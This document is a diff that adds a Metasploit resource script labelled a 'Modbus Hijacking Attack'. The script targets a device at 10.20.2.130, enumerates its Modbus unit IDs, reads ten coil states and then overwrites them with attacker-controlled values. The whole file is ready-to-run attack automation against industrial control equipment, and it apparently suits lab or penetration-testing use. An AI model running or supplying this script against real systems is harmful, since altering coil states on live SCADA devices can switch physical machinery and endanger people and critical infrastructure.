@@ -1,0 +1,49 @@
+# Metasploit Resource Script — Modbus Hijacking Attack
+# Usage: sudo msfconsole -r modbus_hijack.rc
+# Target: Modbus device at 10.20.2.130
+#
+# Phase 1: Discover active unit IDs on the device
+# Phase 2: Read current coil states
+# Phase 3: Write new coil states (hijack)
+
+<ruby>
+target = ENV['MSF_TARGET'] || '10.20.2.130'
+print_status("Modbus hijack target: #{target}")
+
+# -------------------------------------------------------
+# PHASE 1: Unit ID discovery
+# Scans for active Modbus unit IDs on the target device
+# -------------------------------------------------------
+print_status("Phase 1: Scanning for active Modbus unit IDs...")
+run_single("use auxiliary/scanner/scada/modbus_findunitid")
+run_single("set RHOSTS #{target}")
+run_single("run")
+run_single("back")
+
+# -------------------------------------------------------
+# PHASE 2: Read coil states
+# Reads 10 coils starting at data address 0, unit ID 1
+# Coils represent binary output states (on/off) of devices
+# -------------------------------------------------------
+print_status("Phase 2: Reading current coil states...")
+run_single("use auxiliary/scanner/scada/modbusclient")
+run_single("set RHOSTS #{target}")
+run_single("set UNIT_NUMBER 1")
+run_single("set DATA_ADDRESS 0")
+run_single("set NUMBER 10")
+run_single("set ACTION READ_COILS")
+run_single("run")
+
+# -------------------------------------------------------
+# PHASE 3: Write coil states (hijack)
+# Overwrites coil states with attacker-controlled values
+# 1010101010 = alternating on/off across 10 coils
+# -------------------------------------------------------
+print_status("Phase 3: Writing hijacked coil states...")
+run_single("set ACTION WRITE_COILS")
+run_single("set DATA_COILS 1010101010")
+run_single("run")
+run_single("back")
+
+print_status("Modbus hijack complete.")
+</ruby>
